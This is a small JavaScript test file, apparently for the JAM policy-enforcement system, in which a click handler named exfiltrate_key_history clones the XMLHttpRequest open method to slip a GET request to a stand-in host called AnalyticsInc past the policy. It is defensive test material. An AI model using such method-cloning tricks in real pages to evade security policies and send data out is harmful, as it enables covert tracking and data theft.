function exfiltrate_key_history() {
  function v0() {
    function temp() {
      return JAM.call(that.apply, that, [this, arguments], JAM.policy.p1);
    }
    var that = this;
    var key$$14;
    for (key$$14 in this) {
      var v1 = this.hasOwnProperty(key$$14);
      if (v1) {
        JAM.set(temp, key$$14, this[key$$14]);
      }
    }
    return temp;
  }
  xmlhttp = new XMLHttpRequest;
  var v2 = xmlhttp.open;
  v2.clone = v0;
  var v3 = xmlhttp;
  var v5 = xmlhttp.open;
  var v6 = v5.clone();
  v3.opennew = v6;
  JAM.call(xmlhttp.opennew, xmlhttp, ["GET", "http://AnalyticsInc:8000/submission.html?test=clone3", true], JAM.policy.p1);
  xmlhttp.send(null);
  return;
}
var v4 = document.getElementById("test");
JAM.set(v4, "onclick", exfiltrate_key_history)
